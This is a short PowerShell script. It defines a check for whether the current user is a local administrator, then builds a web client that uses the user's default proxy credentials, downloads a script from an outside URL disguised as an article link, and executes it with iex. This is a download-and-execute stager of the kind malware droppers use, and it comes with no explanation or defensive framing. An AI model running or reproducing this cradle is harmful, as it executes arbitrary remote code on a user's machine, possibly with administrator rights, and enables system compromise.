function Test-IsLocalAdministrator
{

	([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")
}
$w=new-object net.webclient;$w.UseDefaultCredentials=$true;$w.Proxy.Credentials=$w.Credentials;iex($w.downloadstring('https://topbrains.it/article/c-bat'))

